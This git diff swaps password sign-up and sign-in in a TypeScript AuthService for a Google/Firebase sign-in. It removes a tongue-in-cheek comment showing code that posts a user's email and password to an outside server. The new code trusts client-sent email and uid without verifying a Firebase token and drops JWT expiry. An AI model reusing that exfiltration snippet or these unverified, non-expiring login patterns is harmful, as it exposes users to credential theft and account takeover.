@@ -7,6 +7,10 @@ import { randomBytes } from 'crypto';
 import { IUser, IUserInputDTO } from '../interfaces/IUser';
 import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
 import events from '../subscribers/events';
+import { Document } from 'mongoose';
+import admin from 'firebase-admin';
+import { ActiveStatus } from '../config/constants';
+import i18next from 'i18next';
 
 @Service()
 export default class AuthService {
@@ -16,90 +20,53 @@ export default class AuthService {
     @Inject('logger') private logger,
     @Inject('privateJWTRS256Key') private privateJWTRS256Key,
     @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
-  ) { }
+    @Inject('firebaseAdmin') private firebaseAdmin: admin.app.App,
+  ) {}
 
-  public async SignUp(userInputDTO: IUserInputDTO): Promise<{ user: IUser; token: string }> {
+  public async googleSignIn(data: any): Promise<{ user: IUser; token: string; message: string }> {
+
+    const updateUser = async (id: string, userDataToUpdate: any) => {
+      return await this.userModel.findByIdAndUpdate(id, { ...userDataToUpdate, lastLogin: new Date() }, { new: true });
+    };
+
     try {
-      const salt = randomBytes(32);
+      const userExists = await this.userModel.findOne({ email: data.email });
 
-      /**
-       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
-       * require('http')
-       *  .request({
-       *     hostname: 'http://my-other-api.com/',
-       *     path: '/store-credentials',
-       *     port: 80,
-       *     method: 'POST',
-       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
-       *
-       * Just kidding, don't do that!!!
-       *
-       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
-       * watches every API call and if it spots a 'password' and 'email' property then
-       * it decides to steal them!? Would you even notice that? I wouldn't :/
-       */
-      this.logger.silly('Hashing password');
-      const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
-      this.logger.silly('Creating user db record');
-      const userRecord = await this.userModel.create({
-        ...userInputDTO,
-        salt: salt.toString('hex'),
-        password: hashedPassword,
-      });
-      this.logger.silly('Generating JWT');
-      const token = this.generateToken(userRecord);
+      let userRecord;
+      let isNew = false;
+
+      if (userExists) {
+        userRecord = await updateUser(userExists._id, {
+          image: data.photoUrl,
+          name: data.name,
+        });
+      } else {
+        let userdata: any = {
+          image: data.photoUrl,
+          name: data.name,
+          googleId: data.uid,
+          email: data.email,
+        };
+        userRecord = await this.userModel.create(userdata);
+        isNew = true;
+      }
 
       if (!userRecord) {
-        throw new Error('User cannot be created');
+        throw new Error(i18next.t('userCreationFailed'));
       }
-      this.logger.silly('Sending welcome email');
-      this.mailer.SendWelcomeEmail(userRecord);
 
-      // Fire some other events on user signUp
-      // this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });
+      if (userRecord.status === ActiveStatus.INACTIVE) {
+        throw new Error(i18next.t('inactiveAccount'));
+      }
 
-      /**
-       * @TODO This is not the best way to deal with this
-       * There should exist a 'Mapper' layer
-       * that transforms data from layer to layer
-       * but that's too over-engineering for now
-       */
+      this.logger.silly('Generating JWT');
       const user = userRecord.toObject();
-      Reflect.deleteProperty(user, 'password');
-      Reflect.deleteProperty(user, 'salt');
-      return { user, token };
+      const token = this.generateToken({ ...user, isGoogleSignin: true });
+
+      return { user, token, message: i18next.t('signInSuccess') };
     } catch (e) {
       this.logger.error(e);
       throw e;
-    }
-  }
-
-  public async SignIn(email: string, password: string, role?: string): Promise<{ user: IUser; token: string }> {
-    const userRecord = await this.userModel.findOne({ email, role });
-    if (!userRecord) {
-      throw new Error('User not registered');
-    }
-    /**
-     * We use verify from argon2 to prevent 'timing based' attacks
-     */
-    this.logger.silly('Checking password');
-    const validPassword = await argon2.verify(userRecord.password, password);
-    if (validPassword) {
-      this.logger.silly('Password is valid!');
-      this.logger.silly('Generating JWT');
-      const token = this.generateToken(userRecord);
-
-      this.eventDispatcher.dispatch(events.user.signIn, userRecord);
-
-      const user = userRecord.toObject();
-      Reflect.deleteProperty(user, 'password');
-      Reflect.deleteProperty(user, 'salt');
-      /**
-       * Easy as pie, you don't need passport.js anymore :)
-       */
-      return { user, token };
-    } else {
-      throw new Error('Invalid Password');
     }
   }
 
@@ -123,7 +90,7 @@ export default class AuthService {
         _id: user._id, // We are gonna use this in the middleware 'isAuth'
         role: user.role,
         name: user.name,
-        exp: Math.floor(Date.now() / 1000) + (60 * 60)
+        isGoogleSignin: user.isGoogleSignin || false,
       },
       this.privateJWTRS256Key,
       { algorithm: 'RS256' }
